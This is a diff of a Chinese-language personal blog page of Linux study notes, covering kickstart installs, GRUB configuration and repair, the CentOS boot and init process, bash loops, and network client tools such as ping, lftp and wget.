+<p>系统安装之后禁用selinux<br>    /etc/sysconfig/selinux 修改SELINUX的值为下面2.3项即可<br>        enforcing<br>        permissive<br>        disable<br>    getenforce  获取状态<br>    setenforce 0 设置关闭，立即生效<br>编辑/etx/sysconfig/selinux 或者 /etc/selinux/config</p>
+<p>halt、poweroff 或者reboot 安装完成之后的行为：<br>repo：指定安装时使用的repository：<br>    repo –name=”CentOS” –baseurl=cdrom:sr0 –cost=100<br>url:指明安装时使用的repository，但为url格式：<br>url –url=<a href="http://xxxx" target="_blank" rel="noopener">http://xxxx</a><br>必须定义好网络，能够访问才行；</p>
+<p>其他可参考官方文档：《Installation Guide》</p>
+<h3 id="如何编辑anaconda-ks-cfg文件"><a href="#如何编辑anaconda-ks-cfg文件" class="headerlink" title="如何编辑anaconda-ks.cfg文件"></a>如何编辑anaconda-ks.cfg文件</h3><p>yum install system-config-kickstart包</p>
+<p>ESC<br>linux ip=xxx.xxx.xxx.xxx netmask=255.255.255.xxx ks=<a href="http://PATH/to/file" target="_blank" rel="noopener">http://PATH/to/file</a></p>
+<p>把光盘的isolinux文件夹拷贝过来<br>把ks文件复制过来<br>放在光盘根目录或者isolinux文件夹下都可以<br>创建光盘镜像<br>mkisofs -R -J -T -v –no-emul-boot –boot-load-size 4 –boot-info-table -V “光盘名字” -c isolinux/boot.cat -b isolinux/isolinux.bin -o /root/boot.iso myboot/</p>
+<p>网络启动<br>dhcp服务器<br>tftp服务器<br>网络仓库</p>
+<p>自动化安装过程<br>DVD ： ks=cdrom：/PATH/TO/KS_FILE<br>HTTP: ks=<a href="http://HOST:PORT/PATH/TO/KS_FILE">http://HOST:PORT/PATH/TO/KS_FILE</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/22/2-24%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -546,638 +1084,6 @@ sysctl variable； 对用/proc/sys目录下有对应关系的文件
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/15/20-grub%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lcxiao">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lcxiao's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/15/20-grub%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">20.grub系统配置与使用</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-06-15 13:11:21 / 修改时间：21:11:36" itemprop="dateCreated datePublished" datetime="2020-06-15T13:11:21+08:00">2020-06-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="GRUB-（Boot-Loader）"><a href="#GRUB-（Boot-Loader）" class="headerlink" title="GRUB （Boot Loader）"></a>GRUB （Boot Loader）</h1><p>grub0.x grub legacy<br>    stage1  MBR<br>    stage1.5    MBR之后的扇区，让stage1中的bootloader能识别stage2所在的分区上的文件系统<br>    stage2  磁盘分区（/boot/grub）</p>
-<pre><code>配置文件：/boot/grub/grub.conf &lt;-- /etc/grub.conf
-
-stage2及内核通常防止与一个基本磁盘分区；</code></pre><p>功用：</p>
-<ol>
-<li>提供一个菜单、并提供交互式接口<br> e：编辑模式，用于编辑菜单：<br> c：命令模式，交互式接口</li>
-<li>加载用户选择的内核或操作系统<br> 允许传递参数给内核<br> 可隐藏此菜单</li>
-<li>为菜单提供了包含机制<br> 为编辑菜单进行认证<br> 为启用内核或操作系统进行认证</li>
-</ol>
-<h2 id="grep的命令行接口"><a href="#grep的命令行接口" class="headerlink" title="grep的命令行接口"></a>grep的命令行接口</h2><p>help ：获取帮助列表<br>help keyword：详细帮助信息<br>find （hd0，0）/PATH/TO/FILE<br>root （hd#，#）设置为grub的根<br>kernel /PATH/TO/KERNEL_FILE ：设定本次启动时用到的内核文件；<br>initrd /PATH/TO/INITRAMFS_FILE:设定为选定的内核提供额外文件的ramdisk：<br>boot：引导启动选定的内核</p>
-<p>手动在grub命令行接口启动系统：<br>grub&gt;root (hd#,#)<br>grub&gt; kernel /vmlinux—<br>grub&gt; initrd /initramfs—<br>grub&gt; boot</p>
-<p>配置文件/boot/grub/grub.conf<br>    配置项：<br>    default=#：设定默认启动的菜单项：落单项（title）编号从0开始；<br>    timeout=#:指定菜单项等待选项选择的时长；<br>    splashimage=（hd#，#）/PATH/TO/XPM_PIC_FILE ：指明菜单背景图片的文件路径；<br>    hideenmenu：隐藏菜单<br>    title TITLE：定义菜单项”标题“，可出现多次，引导多个不同的内核<br>    root（hd#，#） ：grub查找stage2及kernel文件所在设备分区：为grub的根；<br>    kernel /PATH/TO/VMLINUZ_FILE :启动的内核<br>    initrd /PATH/TO/initramfs :内核匹配的ramfs文件；<br>    password [–md5] STRING :启动选定的内核或操作系统时进行认证；</p>
-<p>grub-md5-crypt 命令<br>输入两次密码后生成一个加密字符串，拷贝至grub配置文件中；</p>
-<p>进入单用户模式：</p>
-<ul>
-<li>编辑grub菜单（选定要编辑的title，而后使用e命令）；</li>
-<li>在选定的kernrl后附加<ul>
-<li>1，s，S或single都可以</li>
-</ul>
-</li>
-<li>在kernel所在行，键入b命令；</li>
-</ul>
-<h2 id="安装grub："><a href="#安装grub：" class="headerlink" title="安装grub："></a>安装grub：</h2><p>在运行正常的系统<br>grub-install 命令：<br>可以安装到任意磁盘</p>
-<p>例如：挂载另一块磁盘来做启动，</p>
-<ul>
-<li>为磁盘分区，设置boot分区 /dev/sdb1 根分区/dev/sdb2</li>
-<li>挂载分区 mount /dev/sdb1 /mnt/boot   – mount /dev/sdb2 /mnt/sysroot</li>
-<li>grub install –root-directory=/mnt /dev/sdb<ul>
-<li>在/mnt/boot目录拷贝vmlinuz和initramfs.img文件作为启动内核；</li>
-<li>编辑grub配置文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">default=0</span><br><span class="line">timeout=5</span><br><span class="line">title CentOS(<span class="built_in">test</span>)</span><br><span class="line">      root (hd0,0)</span><br><span class="line">      kernel /vmlinuz ro root=/dev/sda1 </span><br><span class="line">      initrd /initramfs.img</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li>在/mnt/sysroot文件夹下建立FHS标准文件夹，作为根问价您系统，拷贝bash程序和动态依赖库文件到相同目录<ul>
-<li>mkdir -pv bin sbin mnt home usr lib lib64 proc etc media root …</li>
-<li>cp /bin/bash /mnt/sysroot/bin</li>
-<li>ldd /bin/bash</li>
-<li>cp *.so /mnt/sysroot</li>
-<li>chroot /mnt/sysroot<br>grub配置文件中 kernerl /vmlinuz ro root=/dev/sda1 (selinux=0) init=/bin/bash</li>
-</ul>
-</li>
-</ul>
-<p>有点类似于ARClinux安装的流程；</p>
-<h2 id="手动修复损坏的grub：-本机的grub"><a href="#手动修复损坏的grub：-本机的grub" class="headerlink" title="手动修复损坏的grub：(本机的grub)"></a>手动修复损坏的grub：(本机的grub)</h2><ul>
-<li><p>grub-install –root-directory=/ /dev/sda</p>
-<ul>
-<li>–root-directory=（boot目录的父目录）</li>
-</ul>
-</li>
-<li><p>grub命令提示符下安装（要求有boot目录，且存在stage1，stage1.5文件）<br>  grub&gt; root (hd0,0)<br>  grub&gt; setup （hd0）<br>  grub&gt; exit</p>
-</li>
-<li><p>进入系统安装光盘，进入救援模式：</p>
-<ul>
-<li>Rescue installed system</li>
-<li>或者ESC键输入linux rescue （类似winPE）</li>
-<li>–&gt;continue–&gt;挂载在/mnt/sysimage–&gt;shell(start shell)</li>
-<li>chroot /mnt/sysroot</li>
-<li>在命令提示符下grub-install</li>
-<li>exit –&gt; reboot</li>
-</ul>
-</li>
-</ul>
-<p>练习：</p>
-<ol>
-<li>添加硬盘，提供直接单独运行bash系统</li>
-<li>破坏本机grub stage1，而后在救援模式下修复之；</li>
-<li>为grub设备保护功能；</li>
-</ol>
-<p>grub的保护password<br>grub-crypt –sha-256        –&gt;        grub-crypt<br>grub-crypt –md5            –&gt;        grub-md5-crypt<br>/etc/grub.conf文件增加下面这一行，则启动时如果需要编辑grub选项需要先按P键输入密码<br>password –encrypted ^9^32kwzzX./3WISQ0C</p>
-<p>如果在特定title下添加<br>password –encrypted STRING 则选择引导这个内核或者系统时需要先认证；</p>
-<p>如：</p>
-<p>grub-md5-crypt</p>
-<p>password –md5 STRING</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">default=0</span><br><span class="line">timeout=5</span><br><span class="line">splashimage=(hd0,0)/grub/splash.xpm.gz</span><br><span class="line">hiddenmenu</span><br><span class="line">password --md5 <span class="variable">$1</span><span class="variable">$OOmpy0</span><span class="variable">$wue</span>.j4urx8NNf6wfQZkmF/		<span class="comment">#密码的MD5加密形式</span></span><br><span class="line">title CentOS (2.6.32-754.27.1.el6.x86_64)</span><br><span class="line">        root (hd0,0)</span><br><span class="line">        kernel /vmlinuz-2.6.32-754.27.1.el6.x86_64 ro root=/dev/mapper/VolGroup-lv_root rd_NO_LUKS LANG=en_US.UTF-8 rd_NO_MD rd_LVM_LV=VolGroup/lv_swap SYSFONT=latarcyrheb-sun16 crashkernel=auto rd_LVM_LV=VolGroup/lv_root  KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet</span><br><span class="line">        initrd /initramfs-2.6.32-754.27.1.el6.x86_64.img</span><br><span class="line">title CentOS 6 (2.6.32-754.el6.x86_64)</span><br><span class="line">        lock		<span class="comment">#保护开启</span></span><br><span class="line">        root (hd0,0)</span><br><span class="line">        kernel /vmlinuz-2.6.32-754.el6.x86_64 ro root=/dev/mapper/VolGroup-lv_root rd_NO_LUKS LANG=en_US.UTF-8 rd_NO_MD rd_LVM_LV=VolGroup/lv_swap SYSFONT=latarcyrheb-sun16 crashkernel=auto rd_LVM_LV=VolGroup/lv_root  KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet</span><br><span class="line">        initrd /initramfs-2.6.32-754.el6.x86_64.img</span><br></pre></td></tr></table></figure>
-
-
-
-<p>grub-crypt</p>
-<p>password –sha-256 STRING</p>
-<p>在title后面root上一行可以给要保护的启动项添加lock字段，则自动时必须按p键输入密码才能启动；</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># (0) Arch Linux</span><br><span class="line">title  Arch Linux</span><br><span class="line">lock</span><br><span class="line">root   (hd0,1)</span><br><span class="line">kernel &#x2F;boot&#x2F;vmlinuz-linux root&#x3D;&#x2F;dev&#x2F;disk&#x2F;by-label&#x2F;Arch_Linux ro</span><br><span class="line">initrd &#x2F;boot&#x2F;initramfs-linux.img</span><br></pre></td></tr></table></figure>
-
-
-
-<p>如果boot分区单独分区的话，此分区就是grub的根分区；<br>/vmlinuz<br>/grub/grub.conf</p>
-<p>如果没有单独分区的话，<br>这个分区是根，那么vmlinuz文件就是在/boot/vmlinuz<br>/boot/grub/grub.conf</p>
-<p>grub访问的一般为基本磁盘分区<br>单独分区是因为根文件系统比较复杂；</p>
-<p>如何识别设备：<br>hd#，#      两个数字的含义：第几块磁盘，第几个分区；<br>（hd0，0） 第一个磁盘的第一个主分区；</p>
-<p>grub1.x grub2</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/15/19-Linux%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lcxiao">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lcxiao's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/15/19-Linux%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" class="post-title-link" itemprop="url">19.Linux系统启动流程</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-06-15 13:10:58 / 修改时间：21:11:12" itemprop="dateCreated datePublished" datetime="2020-06-15T13:10:58+08:00">2020-06-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="系统启动流程"><a href="#系统启动流程" class="headerlink" title="系统启动流程"></a>系统启动流程</h1><p>Linux系统组成部分：内核，根文件系统<br>内核：进程管理，内存管理、网络协议栈、文件系统、驱动程序、安全功能（加密解密协议栈。selinux）<br>    IPC：Inter Process Communication<br>    消息队列、semerphor、shm<br>    socket<br>文件系统工作在内核空间</p>
-<p>启动分区：/boot<br>rootfs：FHS：/bin /sbin /lib /proc /sys /etc<br>init 程序–</p>
-<p>内核设计流派：</p>
-<ul>
-<li>单内核 ：所有功能集成与同一个程序；<ul>
-<li>Linux</li>
-</ul>
-</li>
-<li>微内核 ：每种功能使用一个单独的子系统实现；<ul>
-<li>Windows，Solaris</li>
-</ul>
-</li>
-</ul>
-<p>Linux内核特点：</p>
-<ul>
-<li>支持模块化    .ko（Kernel Object）</li>
-<li>支持模块运行时动态装载或卸载；</li>
-<li>ramdisk 使用缓存和缓冲来加速对磁盘上的文件访问；</li>
-</ul>
-<p>Linux内核组成部分：</p>
-<ul>
-<li>核心文件  /boot/vmlinuz-VERSION-release</li>
-<li>模块文件  /lib/modules/VERSION-release</li>
-</ul>
-<p>vmlinux —-&gt; ramdisk —-&gt; rootfs<br>内核    –  临时根文件系统  –  切换真正的根文件系统<br>ramdisk：<br>centos5 /boot/initrd-VERSION-release.img<br>CentOS6,7: /boot/initramfs-VERSION-release.img</p>
-<p>模块文件：/lib/modules/VERSION-release </p>
-<p>PC架构的主机系统启动流程，（MBR）：<br>POST：rom（只读）CMOS –BIOS–basic input output system<br>ROM + RAM<br>加电自检<br>Boot Sequence：启动次序,按次序查找各引导设备；第一个有引导程序的设备即为本次启动要用到的设备；<br>bootloader：引导加载器，程序；<br>    windows：ntloader<br>    linux：<br>        LILO：Linux loader<br>        grub ：grand uniform BootLoader<br>        grub0.X grub legacy<br>        grub1.x grub2<br>功能：提供一个界面，允许用户选择要启动的系统或者不同版本的内核，把用户选定的内核装载到RAM中的特定空间中，解压、展开而后把系统控制权移交给内核；</p>
-<p>MBR：Master Boot Record<br>    512bytes:<br>        446bytes:bootloader<br>        64bits:fat<br>        2bytes:55AA<br>GRUB:<br>    Bootloader:1st stage<br>    partition :filesystem driver ,1.5 stage<br>    partition : /boot/grub 2nd stage</p>
-<p>之后是kernel：<br>    自身初始化：<br>        探测可识别到的所有硬件设备<br>        加载硬件驱动程序；（有可能会借助于ramdisk加载驱动）<br>        以只读方式挂载根文件系统；<br>        运行用户空间的第一个程序；INIT?<br>    ramdisk 动态创建；</p>
-<p>INIT文件类型:<br>SYSV,Upstart,Systemd<br>    CentOS5:SysV init 配置文件/etc/inittab<br>    CentOS6: Upstart /etc/inittab   /etc/init/*.conf<br>    CentOS7:Systemd 配置文件：/usr/lib/systemd/system/,/etc/systemd/system<br>注意GPT、UEFI可能不一样？</p>
-<p>安卓手机使用lilo引导</p>
-<p>对自己编译的内核来说，ramdisk可以是非必须的，（直接把硬盘驱动编译至内核）<br>可以使用工具创建：<br>CentOS5：mkinitrd<br>centos6，7<br>initramfs 工具程序<br>dracut ，mkinitrd</p>
-<p>系统初始化流程（内核级别）：POST–BootSequence（BIOS）–BootLoader（MBR）–kernel(ramdisk)–rootfs(readonly)–/sbin/init?</p>
-<p>sbin/init:<br>SysV init:<br>运行级别 （0-6）</p>
-<ul>
-<li>0 ：关机</li>
-<li>1 单用户级别  root 无需认证 ；维护模式</li>
-<li>2 带网络的单用户  启动网络功能，不会启动NFS，维护模式</li>
-<li>3 multiuser mode 多用户。完全认证，完整模式</li>
-<li>4 预留，未用</li>
-<li>5 graphic mode 图形界面</li>
-<li>6 重启</li>
-</ul>
-<p>默认3 5<br>级别切换 init #<br>级别查看：<br>who -r<br>runlevel</p>
-<p>配置文件： /etc/inittab</p>
-<p>CentOS5：每行定义一种action以及与之对应的process<br>id：runlevels：action：process<br>    id：一个任务的标识符<br>    runleves：在哪些级别启动此任务；#，###，也可以为空，表示所有级别；<br>    action：在什么条件下启动此任务；<br>    process：任务；</p>
-<p>action：<br>    wait：等待切换至此任务所在的级别时执行一次；<br>    respawn：一旦此任务终止，就自动重新启动之；<br>    initdefault：设定默认运行级别；此时，process省略；<br>    sysinit：设定系统初始化方式，此处一般为指定/etc/rc.d/ec.sysinit脚本；</p>
-<p>例如：<br>id：3:initdefault:<br>si::sysinit:/etc/rc.d/ec.sysinit<br>l0:0:wait:/etc/rc.d/rc 0<br>    意味着去启动或关闭/etc/rc.d/rc3.d/目录下的服务脚本所控制服务；<br>    K* ：要停止的服务；K##<em>，优先级，数字越小，越是优先关闭；依赖的服务先关闭；而后关闭被依赖的；<br>    S</em>：要启动的服务；S##*，优先级，数字越小，越是优先启动，被依赖的服务先启动，而依赖的服务后启动；</p>
-<p>rc脚本：接受一个运行级别数字为参数；<br>脚本框架:<br>for srv in /etc/rc.d/rc#.d/K*;do<br>    $srv stop<br>done</p>
-<p>for srv in /etc/rc.d/rc#.d/S*;do<br>    $srv start<br>done</p>
-<p>/etc/init.d/* 脚本执行方式：<br>service SRV_SCRIPT {start | stop | status |restart}<br>/etc/init.d/SRV_SCRIPT {start | stop |status |restart}</p>
-<p>Chkconfig 管理这些脚本软连接的<br>管控/etc/init.d /每个服务脚本在各级别下的启动和关闭状态；</p>
-<p>chkconfig SERVICE on | off<br>脚本文件中 “-” 表示 所有级别全关<br>chkconfig –list</p>
-<p>刚添加的脚本还没有创建链接？<br>chkconfig –add<br>chkconfig –del</p>
-<p>#chkconfig：LLL NN NN   LLL：运行级别。NN：开启优先级 NN：关闭优先级<br>#description：说明</p>
-<p>修改指定的链接类型<br>chkconfig {–level LEVELS} name 《on | off | reset》<br>默认2345</p>
-<p>正常级别下，最后一个启动的服务S99local没有链接至/etc/init.d下的某脚本，而是链接到了/etc/rc.d/rc.local脚本；因此，不方便或者不需写服务脚本的程序期望开机自动运行时，直接放置于此脚本文件中即可；</p>
-<p>rc.local<br>用户自定义开机运行的程序</p>
-<p>tty1：:2345：respawn：/usr/sbin/mingetty tty1<br>mingetty会调用login，<br>打开虚拟终端的程序除了mingetty之外，还有诸如getty等；</p>
-<p>系统初始化脚本 /etc/rc.d/rc.sysinit</p>
-<ul>
-<li>设置主机名</li>
-<li>设置欢迎信息</li>
-<li>激活udev和selinux （udev主要是创建设备文件）</li>
-<li>挂载/etc/fstab文件中定义的所有文件系统；</li>
-<li>检测根文件系统，并以读写方式重新挂载根文件系统；</li>
-<li>设置系统时钟</li>
-<li>根据/etc/sysctl.conf文件来设置内核参数</li>
-<li>激活LVM及软RAID设备</li>
-<li>激活swap设备；</li>
-<li>加载额外需要的驱动程序；</li>
-<li>清理操作</li>
-</ul>
-<p>总结（用户空间的启动流程）：/sbin/init (etc/inittab)<br>设置默认运行级别 –&gt; 运行系统初始化脚本 ，完成系统初始化 –&gt; 关闭对应级别下要停止的服务，启动对应级别下需要开启的服务 –&gt; 设置登录终端 –&gt; 【启动图形终端】（可选）；</p>
-<p>通读/etc/rc.d/rc.sysinit 文件；搞清楚每一步做了什么？</p>
-<p>CentOS6：<br>init程序：upstart，但依然为/sbin/init（/etc/inittab）<br>/etc/init/*.conf /etc/inittab （仅用于定义默认运行级别）</p>
-<p>注意：*.conf 为upstart风格的配置文件；</p>
-<p>rcS.conf<br>init-system-dbus.conf<br>start-ttys.conf</p>
-<p>CentOS7: Systemd,配置文件：/usr/lib/systemd/system/* , /etc/systemd/system/*</p>
-<p>systemctl get-default<br>systemctl set-default multi-user.target</p>
-<p>systemctl status<br>完全兼容SysV脚本机制；因此，service命令依然可用，但是，建议使用systemctl命令来控制服务</p>
-<p>systemctl {status | start | stop | restart | reload} SERVICE</p>
-<p>CentOS系统启动流程；</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/15/18-SHELL%E5%BE%AA%E7%8E%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lcxiao">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lcxiao's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/15/18-SHELL%E5%BE%AA%E7%8E%AF/" class="post-title-link" itemprop="url">18.SHELL循环</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-06-15 13:10:33 / 修改时间：21:10:46" itemprop="dateCreated datePublished" datetime="2020-06-15T13:10:33+08:00">2020-06-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="BASH编程"><a href="#BASH编程" class="headerlink" title="BASH编程"></a>BASH编程</h1><p>顺序执行<br>选择执行    if，case<br>循环执行    for，while，until</p>
-<h2 id="for循环格式："><a href="#for循环格式：" class="headerlink" title="for循环格式："></a>for循环格式：</h2><p>for VARAIBLE in LIST；do<br>    循环体<br>done</p>
-<h2 id="while循环："><a href="#while循环：" class="headerlink" title="while循环："></a>while循环：</h2><p>while CONDITION；do<br>    循环体<br>    循环控制变量修正表达式<br>done</p>
-<p>进入条件：CONDITION测试为真<br>退出条件：CONDITION测试为假</p>
-<h2 id="until循环：（相当于while测试条件加！号）"><a href="#until循环：（相当于while测试条件加！号）" class="headerlink" title="until循环：（相当于while测试条件加！号）"></a>until循环：（相当于while测试条件加！号）</h2><p>until CONDITION；do<br>    循环体<br>    循环控制变量修正表达式<br>done<br>进入条件：CONDITION测试为假<br>退出条件：CONDITION测试为真</p>
-<h2 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h2><p>1.求100内偶数之和、100以内奇数之和<br>2、创建10个用户。user101-user110；密码同用户<br>3、打印99乘法表<br>4、打印逆序九九乘法表</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/15/17-%E7%BD%91%E7%BB%9C%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lcxiao">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lcxiao's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/15/17-%E7%BD%91%E7%BB%9C%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">17.网络客户端工具</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-06-15 13:09:56 / 修改时间：21:10:11" itemprop="dateCreated datePublished" datetime="2020-06-15T13:09:56+08:00">2020-06-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="网络客户端工具"><a href="#网络客户端工具" class="headerlink" title="网络客户端工具"></a>网络客户端工具</h1><p>ping、lftp、lftpget、wget等</p>
-<h2 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h2><p>ICMP：<br>    echo request 8<br>    echo reply 0<br>ping 发出echo request命令，返回echo reply；</p>
-<p>ping [option] DESTINATION<br>    -c #：包个数<br>    -I ：接口<br>    -w ：deadline ping命令超时时长；<br>    -W ：一次ping操作中，<br>    -s ：指定包的大小</p>
-<h2 id="hping-："><a href="#hping-：" class="headerlink" title="hping ："></a>hping ：</h2><pre><code>--flood 尽可能的快的发包，压力测试?
---fast  快
---faster    比快更快
--i uX</code></pre><h2 id="traceroute："><a href="#traceroute：" class="headerlink" title="traceroute："></a>traceroute：</h2><p>跟踪从源主机到目标主机之间经过的网关；</p>
-<h2 id="ftp命令"><a href="#ftp命令" class="headerlink" title="ftp命令"></a>ftp命令</h2><p>文件传输协议：<br>put ：上传<br>status：状态<br>bye：退出</p>
-<h2 id="lftp命令："><a href="#lftp命令：" class="headerlink" title="lftp命令："></a>lftp命令：</h2><p>取代ftp的命令<br>-p port<br>-u user[,pass]</p>
-<p>get mget<br>put mput<br>rm</p>
-<h2 id="lftpget"><a href="#lftpget" class="headerlink" title="lftpget"></a>lftpget</h2><p>-c ：继续之前的下载</p>
-<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>非交互式的资源下载器：<br>功能强大<br>wget [option]… [URL]…<br>-b：后台下载<br>-q |–quiet 静默下载（不显示下载进度）<br>-O file ：指明下载文件名<br>-c | –continue ：断点续传<br>–progress=type bar（default） dot 进度条格式<br>–limit-rate=amount ：以指定速率下载文件（–limit-rate=20k）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/15/16-%E8%BF%9B%E7%A8%8B%E5%92%8C%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lcxiao">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lcxiao's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/15/16-%E8%BF%9B%E7%A8%8B%E5%92%8C%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86/" class="post-title-link" itemprop="url">16.进程和作业管理</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-06-15 13:09:30 / 修改时间：21:09:47" itemprop="dateCreated datePublished" datetime="2020-06-15T13:09:30+08:00">2020-06-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
